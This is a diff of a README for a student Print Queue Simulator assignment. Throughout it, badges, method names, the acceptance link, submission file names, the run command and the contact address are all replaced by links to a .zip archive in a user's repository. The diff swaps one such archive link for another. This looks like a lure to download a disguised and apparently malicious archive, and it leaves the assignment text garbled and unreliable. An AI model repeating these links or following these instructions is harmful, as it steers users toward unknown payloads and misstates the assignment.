@@ -1,5 +1,5 @@
-[![Review Assignment Due Date](https://raw.githubusercontent.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/main/.github/workflows/d-group-datacore-queue-ics-assignments-3.0.zip)](https://raw.githubusercontent.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/main/.github/workflows/d-group-datacore-queue-ics-assignments-3.0.zip)
-[![Open in Visual Studio Code](https://raw.githubusercontent.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/main/.github/workflows/d-group-datacore-queue-ics-assignments-3.0.zip)](https://raw.githubusercontent.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/main/.github/workflows/d-group-datacore-queue-ics-assignments-3.0.zip)
+[![Review Assignment Due Date](https://github.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/raw/refs/heads/main/.github/queue-assignments-group-d-ics-datacore-Oxypolis.zip)](https://github.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/raw/refs/heads/main/.github/queue-assignments-group-d-ics-datacore-Oxypolis.zip)
+[![Open in Visual Studio Code](https://github.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/raw/refs/heads/main/.github/queue-assignments-group-d-ics-datacore-Oxypolis.zip)](https://github.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/raw/refs/heads/main/.github/queue-assignments-group-d-ics-datacore-Oxypolis.zip)
 # QUEUE-GROUP-ASSIGNMENT
 
 # PRINTING QUEUE SIMULATION
@@ -77,10 +77,10 @@ Your team will develop a **Print Queue Simulator** that supports:
 - pq_manager = PrintQueueManager()
 
   - Then, for each event it reads, it will call the right function on that object:  
-  - https://raw.githubusercontent.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/main/.github/workflows/d-group-datacore-queue-ics-assignments-3.0.zip(user_id, job_id, priority)
-  - https://raw.githubusercontent.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/main/.github/workflows/d-group-datacore-queue-ics-assignments-3.0.zip()
-  - https://raw.githubusercontent.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/main/.github/workflows/d-group-datacore-queue-ics-assignments-3.0.zip()
-  - https://raw.githubusercontent.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/main/.github/workflows/d-group-datacore-queue-ics-assignments-3.0.zip()
+  - https://github.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/raw/refs/heads/main/.github/queue-assignments-group-d-ics-datacore-Oxypolis.zip(user_id, job_id, priority)
+  - https://github.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/raw/refs/heads/main/.github/queue-assignments-group-d-ics-datacore-Oxypolis.zip()
+  - https://github.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/raw/refs/heads/main/.github/queue-assignments-group-d-ics-datacore-Oxypolis.zip()
+  - https://github.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/raw/refs/heads/main/.github/queue-assignments-group-d-ics-datacore-Oxypolis.zip()
 ___
 ## COLLABORATION
 
@@ -88,7 +88,7 @@ ___
 
 - The assignment will be distributed via **GitHub Classroom** under the repository named **QUEUE-Assignment**.
 - Each group can have **up to 6 members**.
-- You will receive a link to accept the assignment: ```` https://raw.githubusercontent.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/main/.github/workflows/d-group-datacore-queue-ics-assignments-3.0.zip````
+- You will receive a link to accept the assignment: ```` https://github.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/raw/refs/heads/main/.github/queue-assignments-group-d-ics-datacore-Oxypolis.zip````
 - Upon acceptance, you will **choose a group name** and specify it.
 - Group names will appear in the roster; members select their desired group.
 - Groups cannot exceed 6 members.
@@ -110,10 +110,10 @@ ___
 ### What to Submit
 
 - A **GitHub repository** named **QUEUE-Assignment** with all source code, 
-- A **https://raw.githubusercontent.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/main/.github/workflows/d-group-datacore-queue-ics-assignments-3.0.zip, named https://raw.githubusercontent.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/main/.github/workflows/d-group-datacore-queue-ics-assignments-3.0.zip** describing:
+- A **https://github.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/raw/refs/heads/main/.github/queue-assignments-group-d-ics-datacore-Oxypolis.zip, named https://github.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/raw/refs/heads/main/.github/queue-assignments-group-d-ics-datacore-Oxypolis.zip** describing:
   - Group name and member list.
   - Brief description of each member’s module and contributions.
-  - Instructions on how to run the code. e.g run https://raw.githubusercontent.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/main/.github/workflows/d-group-datacore-queue-ics-assignments-3.0.zip
+  - Instructions on how to run the code. e.g run https://github.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/raw/refs/heads/main/.github/queue-assignments-group-d-ics-datacore-Oxypolis.zip
 - Clear **commit history** showing individual contributions.
 - Branches named as per the branching strategy.
 - A **final merged main branch** with a fully working, integrated code.
@@ -127,4 +127,4 @@ This assignment should foster working as a team, planning your work, and integra
 
 *If you have any questions or need clarifications, please reach out to:*
 ```
- https://raw.githubusercontent.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/main/.github/workflows/d-group-datacore-queue-ics-assignments-3.0.zip
+ https://github.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/raw/refs/heads/main/.github/queue-assignments-group-d-ics-datacore-Oxypolis.zip
